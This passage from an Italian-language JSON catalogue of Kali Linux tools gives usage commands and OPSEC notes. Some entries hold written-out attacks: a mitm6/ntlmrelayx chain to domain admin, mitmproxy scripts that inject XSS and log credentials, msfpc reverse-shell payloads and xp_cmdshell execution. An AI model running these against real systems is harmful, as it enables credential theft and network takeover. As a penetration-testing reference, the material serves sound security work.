/etc/miredo/miredo.conf\n\n# Usa server Teredo alternativo\nsudo miredo teredo.remlab.net\n\n# Modalità foreground per debug\nsudo miredo -f -d</code></pre><p>Una volta attivo, qualsiasi applicazione può usare IPv6 normalmente attraverso l'interfaccia teredo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Penetration Testing</strong>, Miredo permette di accedere a servizi IPv6-only da reti che hanno solo connettività IPv4, utile per testare dual-stack o servizi esposti solo su IPv6.</p><p>Nel <strong>Firewall Bypass</strong>, poiché il traffico Teredo usa UDP (tipicamente porta 3544), può attraversare firewall configurati solo per bloccare IPv6 nativo. Questo può essere sfruttato per raggiungere host IPv6 altrimenti inaccessibili.</p><p>Per <strong>IPv6 Security Research</strong>, permette di studiare il comportamento di protocolli e servizi IPv6 senza necessità di connettività nativa, ideale per laboratori di testing.</p><p>Durante <strong>CTF e Lab</strong>, fornisce rapidamente connettività IPv6 per challenge che richiedono accesso a risorse su IPv6.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico Teredo usa UDP sulla porta 3544 con pattern riconoscibili. I server Teredo pubblici (Microsoft, remlab.net) possono loggare le connessioni. Deep packet inspection può identificare il protocollo.</p><p><strong>Impatto:</strong> Aggiunge latenza significativa rispetto a IPv6 nativo a causa dell'encapsulation e del routing attraverso relay. Non adatto per traffico ad alta performance.</p><p><strong>Limitazioni:</strong> Teredo è considerato un protocollo legacy e sta venendo deprecato. Alcuni server pubblici potrebbero essere inaffidabili o cessare il servizio. Non funziona con tutti i tipi di NAT (symmetric NAT problematico).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "missidentify",
    "name": "missidentify",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/missidentify/",
    "desc": "Trova eseguibili Windows rinominati o con estensione sbagliata in analisi forense.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Missidentify</strong> trova file Windows PE (eseguibili) che hanno estensione diversa da .exe o nome fuorviante. Utile in forensics per identificare malware mascherato, eseguibili rinominati per evasion, o file sospetti nascosti con estensioni innocue come .jpg o .txt.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PE Detection:</strong> Identifica file PE indipendentemente dall'estensione.</p><p><strong>Recursive:</strong> Scansione di directory completa.</p><p><strong>Fast:</strong> Analisi basata su magic bytes.</p><p><strong>Report:</strong> Lista file sospetti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione directory\nmissidentify /path/to/scan\n\n# Ricorsiva\nmissidentify -r /evidence/\n\n# Solo file non-.exe\nmissidentify -r /evidence/ | grep -v \".exe$\"\n\n# Output su file\nmissidentify -r /mnt/evidence > suspicious.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Forensics</strong>, trova malware mascherato.</p><p>Nel <strong>Incident Response</strong>, identifica file sospetti.</p><p><strong>Malware Hunting</strong> su immagini disco.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-only:</strong> Solo lettura dei file. Non modifica evidence. Veloce per grandi volumi di dati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "mitm6",
    "name": "mitm6",
    "version": "0.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mitm6/",
    "desc": "Sfrutta configurazione IPv6 di default in Windows per MITM e relay di credenziali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mitm6</strong> sfrutta la configurazione IPv6 di default in Windows per eseguire MITM. Windows preferisce IPv6 e accetta Router Advertisement da qualsiasi sorgente. Mitm6 diventa il DNS IPv6 della rete, intercettando query DNS e relay di autenticazione NTLM.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DHCPv6:</strong> Fornisce configurazione IPv6.</p><p><strong>DNS Spoofing:</strong> Risponde a query DNS.</p><p><strong>WPAD Injection:</strong> Inietta proxy config.</p><p><strong>NTLM Relay:</strong> Integra con ntlmrelayx.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === ATTACCO BASE: NTLM RELAY A LDAP ===\n# Terminal 1: mitm6 spoofing\nmitm6 -d corp.local -i eth0\n\n# Terminal 2: ntlmrelayx per creare computer account (RBCD)\nntlmrelayx.py -6 -wh attacker.corp.local -t ldaps://dc.corp.local --delegate-access -l loot/\n\n# === ESC8: ADCS RELAY (Privilege Escalation to DA) ===\n# Prerequisiti: CA con Web Enrollment abilitato\n# Terminal 1: mitm6\nmitm6 -d corp.local --ignore-nofqdn\n\n# Terminal 2: ntlmrelayx a ADCS per richiedere certificato\nntlmrelayx.py -6 -wh attacker.corp.local \\\n  -t http://ca.corp.local/certsrv/certfnsh.asp \\\n  --adcs --template DomainController\n\n# Risultato: certificato del DC\n# Usa certificato per autenticazione\ncertipy auth -pfx dc.pfx -dc-ip 10.10.10.1\n\n# === RELAY A SMB (Remote Code Execution) ===\n# Relay a target SMB per eseguire comandi\nmitm6 -d corp.local\nntlmrelayx.py -6 -wh attacker -t smb://target.corp.local -c \"whoami > C:\\\\pwned.txt\"\n\n# === TARGETING SPECIFICO ===\n# Solo certi host (meno rumore)\nmitm6 -d corp.local --filter-host workstation01,workstation02\n\n# Ignora host specifici (evita detection su server monitorati)\nmitm6 -d corp.local --ignore-host dc01,dc02\n\n# === ATTACK CHAIN COMPLETA ===\n# 1. mitm6 cattura autenticazione workstation\nmitm6 -d corp.local\n\n# 2. Relay a LDAP per RBCD attack\nntlmrelayx.py -6 -wh attacker -t ldaps://dc.corp.local --delegate-access\n\n# 3. Output: EVILPC$ computer account creato\n# 4. Usa RBCD per impersonare admin\ngetST.py -spn cifs/target.corp.local corp.local/EVILPC$ -impersonate Administrator\nexport KRB5CCNAME=Administrator.ccache\npsexec.py -k -no-pass corp.local/Administrator@target.corp.local\n\n# === MONITORING MODE ===\n# Solo osserva traffico DHCPv6 senza rispondere\nmitm6 -d corp.local --ignore-nofqdn -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Exploitation</strong>, relay credentials per accesso privilegiato.</p><p><strong>ADCS Attacks (ESC8)</strong>, ottenere certificati di Domain Controller.</p><p><strong>RBCD</strong>, creare machine account per impersonation.</p><p><strong>Red Team</strong> per initial foothold in rete interna.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> DHCPv6 traffic anomalo su reti IPv4-only. Microsoft Defender for Identity rileva NTLM relay. ADCS relay genera Event ID 4768. Usare filtering per ridurre rumore. Funziona solo se SMB Signing non è enforced.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "mitmproxy",
    "name": "mitmproxy",
    "version": "12.1.2",
    "icon": "../app/icons/mitmproxy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mitmproxy/",
    "desc": "Proxy HTTP interattivo per intercettare, modificare e replay di traffico web e API.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mitmproxy</strong> è un proxy HTTP/HTTPS interattivo per intercettare, ispezionare, modificare e replay di traffico. Include TUI (mitmproxy), web interface (mitmweb), e scripting Python (mitmdump). Perfetto per debug API, security testing, e analisi di app mobile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intercept:</strong> Cattura tutto il traffico HTTP/S.</p><p><strong>Modify:</strong> Altera request/response on-the-fly.</p><p><strong>Replay:</strong> Rigioca traffico catturato.</p><p><strong>Script:</strong> Automazione con Python.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === MODALITÀ BASE ===\nmitmproxy                    # TUI interattiva\nmitmweb                      # Web interface su :8081\nmitmdump -w traffic.flow     # Dump su file\n\n# === TRANSPARENT PROXY (senza config client) ===\n# Setup iptables per redirect traffico\niptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080\niptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080\nmitmproxy --mode transparent --showhost\n\n# === INTERCEPT FILTERS ===\n# Intercetta solo API specifiche\nmitmproxy --intercept \"~u /api/ &amp; ~m POST\"\n# Ignora asset statici\nmitmproxy --ignore-hosts \".*\\.googleapis\\.com|.*\\.gstatic\\.com\"\n\n# === PYTHON SCRIPTING ===\n# inject_payload.py - Inject XSS in tutte le response\nfrom mitmproxy import http\ndef response(flow: http.HTTPFlow):\n    if flow.response and \"text/html\" in flow.response.headers.get(\"content-type\", \"\"):\n        flow.response.text = flow.response.text.replace(\"&lt;/body&gt;\", '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;&lt;/body&gt;')\n\n# credential_logger.py - Log tutte le credenziali\nfrom mitmproxy import http\nimport json\ndef request(flow: http.HTTPFlow):\n    if flow.request.method == \"POST\":\n        body = flow.request.get_text()\n        if any(k in body.lower() for k in [\"password\", \"passwd\", \"pwd\", \"token\"]):\n            with open(\"creds.log\", \"a\") as f:\n                f.write(f\"{flow.request.pretty_url}\\n{body}\\n\\n\")\n\nmitmdump -s inject_payload.py\nmitmdump -s credential_logger.py -w creds.flow\n\n# === MOBILE APP TESTING ===\n# Proxy su tutte le interfacce\nmitmproxy --listen-host 0.0.0.0 -p 8080\n# Installa CA su device: http://mitm.it\n\n# SSL Pinning Bypass (con Frida)\nfrida -U -f com.target.app -l ssl_bypass.js --no-pause\nmitmproxy --ssl-insecure  # Ignora errori cert\n\n# === REPLAY E FUZZING ===\n# Salva flow specifico\nmitmdump -w login.flow \"~u /api/login\"\n# Replay con modifiche\nmitmdump -n -r login.flow --modify-body \"/password:.*/password:fuzzed/\"\n\n# === REVERSE PROXY MODE ===\n# Proxy davanti a backend (per testing)\nmitmproxy --mode reverse:http://backend:8080\n\n# === UPSTREAM PROXY (Burp chain) ===\nmitmproxy --mode upstream:http://127.0.0.1:8081</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>API Testing</strong>, debug e modifica di API call.</p><p>Nel <strong>Mobile Security</strong>, analisi traffico app con SSL pinning bypass.</p><p><strong>Web Pentesting</strong> per credential harvesting e payload injection automatizzata.</p><p><strong>Red Team</strong> per MITM on-path attacks.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>MITM Position:</strong> Richiede controllo del traffico (ARP spoof, DNS spoof, o gateway). Certificate warning sui client senza CA installata. Tutti i dati transitano in chiaro sul proxy - proteggere i log.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "msfpc",
    "name": "msfpc",
    "version": "1.4.5",
    "icon": "../app/icons/msfpc-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/msfpc/",
    "desc": "Genera payload Metasploit rapidamente con wizard interattivo e output multi-formato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MSFPC</strong> (MSFvenom Payload Creator) semplifica la generazione di payload Metasploit. Wizard interattivo guida nella scelta di piattaforma, tipo di shell, encoding e formato output. Genera payload in tutti i formati supportati da msfvenom con un singolo comando.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Wizard:</strong> Generazione guidata passo-passo.</p><p><strong>Multi-format:</strong> EXE, ELF, APK, PS1, Python, etc.</p><p><strong>Auto-handler:</strong> Genera anche handler msfconsole.</p><p><strong>Encoding:</strong> Applica encoder automaticamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Wizard interattivo\nmsfpc\n\n# Quick generate Windows reverse shell\nmsfpc windows 192.168.1.100 4444\n\n# Linux payload\nmsfpc linux 192.168.1.100 4444\n\n# Android APK\nmsfpc apk 192.168.1.100 4444\n\n# Output include payload + handler.rc</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Payload</strong>, generazione rapida senza memorizzare sintassi.</p><p>Nel <strong>Learning</strong>, capire opzioni msfvenom.</p><p><strong>CTF</strong> per payload veloci.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Come msfvenom:</strong> Payload Metasploit sono molto detectati. Necessario encoding/crypting aggiuntivo. Signature note a tutti gli AV.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "mssqlpwner",
    "name": "mssqlpwner",
    "version": "1.3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mssqlpwner/",
    "desc": "Sfrutta linked server MSSQL per privilege escalation e lateral movement via SQL.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MSSQLPwner</strong> sfrutta linked server e altre feature di Microsoft SQL Server per privilege escalation e lateral movement. Enumera link tra server, esegue query attraverso chain di linked server, e può ottenere code execution sfruttando xp_cmdshell e altre stored procedure.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Link Enumeration:</strong> Mappa linked server.</p><p><strong>Link Crawling:</strong> Query attraverso chain.</p><p><strong>Privilege Escalation:</strong> Da user a sysadmin.</p><p><strong>Code Execution:</strong> xp_cmdshell, OLE automation.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera linked server\nmssqlpwner -d domain -u user -p pass -t mssql.target.com enum\n\n# Crawl tutti i link\nmssqlpwner -d domain -u user -p pass -t mssql.target.com crawl\n\n# Esegui comando via link\nmssqlpwner -t mssql.target.com exec -q \"xp_cmdshell 'whoami'\"\n\n# Privilege escalation\nmssqlpwner -t mssql.target.com privesc</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Database Exploitation</strong>, movimento tra SQL Server.</p><p>Nel <strong>AD Pentesting</strong>, spesso MSSQL ha link privilegiati.</p><p><strong>Lateral Movement</strong> via database.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Loggabile:</strong> Query SQL loggabili. xp_cmdshell genera eventi. Link traversal visibile. Audit SQL Server può rilevare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "mxcheck",
    "name": "mxcheck",
    "version": "1.7.0",
    "icon": "../app/icons/mxcheck-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mxcheck/",
    "desc": "Verifica configurazione MX record e test di connessione SMTP per domini email.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MXCheck</strong> è uno strumento di diagnostica e reconnaissance per infrastrutture email che verifica la configurazione dei record MX di un dominio e testa la connettività SMTP verso i mail server. Analizza priorità MX, verifica la raggiungibilità dei server, testa per open relay, e identifica misconfigurazioni che potrebbero essere sfruttate per phishing o che causano problemi di deliverability. È utile sia per security assessment che per troubleshooting di problemi email.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MX Record Resolution:</strong> Esegue query DNS per recuperare tutti i record MX del dominio target, mostrando priorità e hostname di ogni mail server configurato. Identifica configurazioni ridondanti e potenziali single point of failure.</p><p><strong>SMTP Connectivity Testing:</strong> Stabilisce connessioni TCP sulla porta 25 (o 587/465) verso ogni mail server identificato, verificando che siano effettivamente raggiungibili e rispondano correttamente ai comandi SMTP iniziali (EHLO/HELO).</p><p><strong>Open Relay Detection:</strong> Testa se i mail server accettano email per domini esterni senza autenticazione, una misconfiguration grave che permette l'uso del server per spam e phishing.</p><p><strong>Banner Grabbing:</strong> Cattura i banner SMTP dei server che rivelano software e versione (Postfix, Exchange, Sendmail), informazioni utili per identificare vulnerabilità note.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MXCheck accetta un dominio come parametro e esegue tutti i controlli automaticamente.</p><pre><code># Check completo configurazione MX\nmxcheck target.com\n\n# Output verboso con dettagli SMTP\nmxcheck -v target.com\n\n# Test specifico mail server\nmxcheck -s mail.target.com target.com\n\n# Verifica solo connettività (no relay test)\nmxcheck -c target.com\n\n# Output in formato machine-readable\nmxcheck -q target.com\n\n# Specifica DNS server alternativo\nmxcheck -d 8.8.8.8 target.com</code></pre><p>L'output mostra lo stato di ogni server MX con indicazione chiara di problemi identificati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Email Infrastructure Reconnaissance</strong>, MXCheck mappa l'infrastruttura mail di un'organizzazione, identificando provider (Google Workspace, Microsoft 365, self-hosted), ridondanza, e potenziali target per attacchi.</p><p>Per <strong>Security Assessment</strong>, identifica open relay (grave), mail server con software obsoleto, e misconfigurazioni SPF/DKIM che facilitano spoofing.</p><p>Nel <strong>Phishing Campaign Preparation</strong> (autorizzato), capire l'infrastruttura email del target aiuta a crafting email più convincenti e a identificare punti deboli nelle difese.</p><p>Per <strong>Email Troubleshooting</strong>, IT admin possono verificare rapidamente se i mail server sono configurati correttamente e raggiungibili dall'esterno.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query DNS sono standard e non sospette. Le connessioni SMTP alla porta 25 sono normali per diagnostica. Tuttavia, test di open relay ripetuti potrebbero essere loggati come attività sospetta.</p><p><strong>Impatto:</strong> MXCheck non invia email effettive durante i test, quindi non c'è rischio di spam o bounce. Le connessioni SMTP sono limitate alla fase di handshake.</p><p><strong>Limitazioni:</strong> Alcuni mail server potrebbero bloccare connessioni da IP non autorizzati o richiedere STARTTLS, causando falsi negativi nei test di connettività.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "naabu",
    "name": "naabu",
    "version": "2.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/naabu/",
    "desc": "Port scanner veloce scritto in Go, ottimo per discovery su larga scala con output JSON.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Naabu</strong> è un port scanner veloce sviluppato da ProjectDiscovery in Go. Ottimizzato per discovery su larga scala, integra perfettamente con altri tool della suite (httpx, nuclei). Supporta SYN/CONNECT scan, output JSON, e validazione con Nmap per massima affidabilità.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fast:</strong> Scan veloce con goroutines.</p><p><strong>SYN/CONNECT:</strong> Entrambe le modalità.</p><p><strong>Nmap Verify:</strong> Validazione risultati con Nmap.</p><p><strong>JSON Output:</strong> Integrazione pipeline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base\nnaabu -host target.com\n\n# Top 100 porte\nnaabu -host target.com -top-ports 100\n\n# Con output JSON\nnaabu -host target.com -json -o results.json\n\n# Pipeline con httpx\nnaabu -host target.com -silent | httpx\n\n# Da lista\nnaabu -list hosts.txt -p 80,443,8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Bug Bounty</strong>, discovery veloce in scope ampi.</p><p>Nel <strong>Recon</strong>, alternativa veloce a Nmap.</p><p><strong>Pipeline</strong> con tool ProjectDiscovery.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Attivo:</strong> Scanning visibile come qualsiasi port scanner. Rate limiting configurabile. User-agent e source port customizzabili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "name-that-hash",
    "name": "name-that-hash",
    "version": "1.11.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/name-that-hash/",
    "desc": "Identifica automaticamente il tipo di hash analizzando pattern e lunghezza del digest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Name-That-Hash</strong> (nth) è uno strumento di identificazione automatica degli hash che analizza la struttura, lunghezza, charset, e pattern di un digest per determinarne il tipo. Con supporto per oltre 300 formati di hash diversi, è essenziale quando si incontrano credenziali hashate durante penetration test o CTF e non si conosce l'algoritmo utilizzato. La caratteristica distintiva è che fornisce direttamente i comandi Hashcat e John the Ripper pronti per il cracking.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Extensive Hash Database:</strong> Riconosce oltre 300 tipi di hash, dai comuni (MD5, SHA-1, SHA-256, bcrypt) agli esotici (hash di applicazioni specifiche, formati legacy, hash salted complessi). Il database è costantemente aggiornato con nuovi formati.</p><p><strong>Confidence Scoring:</strong> Per ogni match, fornisce un punteggio di confidenza basato su quanto le caratteristiche dell'hash corrispondono al pattern atteso. Questo aiuta a prioritizzare i tentativi quando multiple identificazioni sono possibili.</p><p><strong>Ready-to-Use Commands:</strong> Per ogni tipo identificato, genera i comandi esatti per Hashcat (-m mode) e John the Ripper (--format), eliminando la necessità di cercare la documentazione.</p><p><strong>Programmatic API:</strong> Può essere usato come libreria Python per integrazione in script e pipeline automatizzate. Output disponibile in JSON per parsing programmatico.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'interfaccia CLI è semplice e supporta input singolo o da file.</p><pre><code># Identifica un singolo hash\nnth -t '5f4dcc3b5aa765d61d8327deb882cf99'\n\n# Output tipico:\n# Most Likely: MD5, HC: 0, JtR: raw-md5\n# Also possible: NTLM, HC: 1000, JtR: nt\n\n# Identifica hash da file (uno per riga)\nnth -f hashes.txt\n\n# Modalità accessibile (output semplificato)\nnth -t 'HASH' --accessible\n\n# Output JSON per scripting\nnth -t 'HASH' --json\n\n# Identifica hash bcrypt\nnth -t '$2b$12$EXAMPLEhashHERE...'\n\n# Pipe da altri comandi\necho 'e10adc3949ba59abbe56e057f20f883e' | nth</code></pre><p>L'output colorato evidenzia le identificazioni più probabili e include link alla documentazione per formati meno comuni.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Prima del <strong>Password Cracking</strong>, identificare correttamente il tipo di hash è fondamentale. Un errore nell'identificazione significa sprecare ore di GPU time su un algoritmo sbagliato. Name-That-Hash elimina questo problema.</p><p>Durante <strong>CTF</strong>, le challenge crypto spesso includono hash sconosciuti. L'identificazione rapida permette di concentrarsi sulla soluzione invece che sulla ricerca del formato.</p><p>In <strong>Digital Forensics</strong>, analizzando database di credenziali o file di configurazione, è comune incontrare hash in formati proprietari o applicazione-specifici che richiedono identificazione.</p><p>Per <strong>Vulnerability Research</strong>, capire quale algoritmo usa un'applicazione per hashare le password rivela informazioni sulla sua sicurezza (MD5 vs bcrypt è una differenza enorme).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Completamente Offline:</strong> Name-That-Hash esegue tutta l'analisi localmente. Gli hash non vengono mai inviati a servizi esterni, rendendolo sicuro per l'uso con credenziali sensibili di clienti.</p><p><strong>Limitazioni:</strong> L'identificazione è basata su pattern e può avere falsi positivi. Hash MD5 e NTLM, ad esempio, hanno la stessa lunghezza e charset - il contesto (Windows vs web application) deve guidare la scelta finale.</p><p><strong>Salted Hashes:</strong> Per hash salted complessi, potrebbe identificare solo la famiglia generale dell'algoritmo. Verificare sempre la documentazione dell'applicazione sorgente per il formato esatto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "nasty",
    "name": "nasty",
    "version": "0.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nasty/",
    "desc": "Tool per recupero chiavi PGP da keyserver pubblici tramite query avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nasty</strong> è uno strumento OSINT specializzato nel recupero e nell'analisi di chiavi PGP/GPG da keyserver pubblici. Interrogando la rete distribuita di keyserver (SKS pool, keys.openpgp.org, keyserver.ubuntu.com), permette di scoprire chiavi crittografiche associate a individui o organizzazioni target. Le chiavi PGP sono una fonte preziosa di intelligence poiché spesso contengono email verificate, nomi reali, e metadati sulla data di creazione e le preferenze crittografiche dell'utente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Keyserver Query:</strong> Interroga simultaneamente diversi keyserver pubblici per massimizzare la copertura. Supporta il protocollo HKP (HTTP Keyserver Protocol) standard e può utilizzare server personalizzati.</p><p><strong>Advanced Search:</strong> Permette ricerche per indirizzo email (esatto o parziale), nome utente, key ID (short o long), e fingerprint completo. Le ricerche parziali sono utili per scoprire varianti di email o alias sconosciuti.</p><p><strong>Key Metadata Extraction:</strong> Oltre a scaricare la chiave, estrae e presenta metadati significativi: data di creazione, data di scadenza, algoritmo crittografico, dimensione della chiave, User ID associati, e firme ricevute da altre chiavi (web of trust).</p><p><strong>Signature Analysis:</strong> Analizza le firme sulla chiave per mappare il \"web of trust\" dell'utente, rivelando potenziali associazioni con altri individui o organizzazioni che hanno firmato la chiave.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Nasty si usa da riga di comando con vari parametri di ricerca.</p><pre><code># Cerca chiavi associate a un'email\nnasty -e target@domain.com\n\n# Cerca per nome (può restituire molti risultati)\nnasty -n \"John Doe\"\n\n# Cerca per key ID (8 o 16 caratteri hex)\nnasty -k 0x12345678\nnasty -k 0x1234567890ABCDEF\n\n# Specifica keyserver alternativo\nnasty -s keys.openpgp.org -e target@domain.com\n\n# Cerca per dominio (trova tutte le chiavi @domain.com)\nnasty -e \"@targetcorp.com\"\n\n# Scarica chiave trovata\nnasty -e target@domain.com --download > key.asc</code></pre><p>L'output include tutti i User ID associati alla chiave, permettendo di scoprire email alternative o alias che il target potrebbe utilizzare.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante attività di <strong>OSINT</strong>, le chiavi PGP rivelano informazioni preziose: email personali e lavorative, nomi reali (se diversi dagli handle online), e attraverso il web of trust, connessioni con altri individui nella comunità.</p><p>Per <strong>Email Discovery</strong>, cercando il nome di un target si possono scoprire email aziendali o personali non altrimenti pubbliche, utili per phishing mirato o password spraying.</p><p>Nella <strong>Attribution Research</strong>, le chiavi PGP possono collegare pseudonimi online a identità reali, o rivelare partecipazione a progetti open source, mailing list, o comunità specifiche.</p><p>Per <strong>Cryptocurrency Investigation</strong>, molti utenti di Bitcoin e altre criptovalute utilizzano PGP per la verifica delle identità, rendendo i keyserver una risorsa per investigazioni su marketplace o transazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query ai keyserver sono completamente passive dal punto di vista del target - non viene notificato delle ricerche. Tuttavia, i keyserver possono loggare le query ricevute, potenzialmente rivelando l'interesse di un investigatore.</p><p><strong>Impatto:</strong> Nessuno. Le chiavi PGP sui keyserver pubblici sono informazioni intenzionalmente pubblicate dagli utenti.</p><p><strong>Limitazioni:</strong> Non tutte le chiavi sono su keyserver pubblici. Chiavi create recentemente su keys.openpgp.org richiedono verifica email e potrebbero non apparire nelle ricerche per nome. Il pool SKS ha avuto problemi di availability negli ultimi anni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "nbtscan-unixwiz",
    "name": "nbtscan-unixwiz",
    "version": "1.0.35",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nbtscan-unixwiz/",
    "desc": "Scanner NetBIOS per identificare sistemi Windows e share di rete in subnet locali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>NBTScan-unixwiz</strong> è la versione sviluppata da Steve Friedl (unixwiz.net) dello scanner NetBIOS, ottimizzata per sistemi Unix/Linux. A differenza di altre implementazioni, questa versione è progettata per essere particolarmente veloce e leggera, utilizzando query UDP parallele per scansionare grandi subnet in pochi secondi. È lo strumento ideale per la discovery rapida di sistemi Windows in ambienti enterprise durante le fasi iniziali di un penetration test interno.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Parallel UDP Scanning:</strong> Implementa un meccanismo di query parallele che permette di scansionare intere subnet /24 in pochi secondi. Utilizza socket raw per massimizzare l'efficienza e minimizzare l'overhead di sistema.</p><p><strong>NetBIOS Name Resolution:</strong> Interroga il NetBIOS Name Service (porta 137/UDP) per ottenere la tabella dei nomi registrati su ogni host, incluso il nome macchina, il workgroup/domain di appartenenza, e i servizi NetBIOS attivi.</p><p><strong>Service Type Detection:</strong> Interpreta i suffissi NetBIOS per identificare il ruolo di ogni sistema: workstation (<00>), file server (<20>), domain controller, browser master, messenger service. Questa informazione aiuta a prioritizzare i target.</p><p><strong>MAC Address Retrieval:</strong> Estrae l'indirizzo MAC hardware dalla risposta NetBIOS, permettendo di identificare il vendor della scheda di rete e potenzialmente il tipo di dispositivo (server fisico, VM, appliance).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'interfaccia a riga di comando è minimale e orientata alla velocità. Supporta range CIDR e output in vari formati.</p><pre><code># Scan rapido di una subnet\nnbtscan-unixwiz 192.168.1.0/24\n\n# Output verboso con dettagli servizi\nnbtscan-unixwiz -v 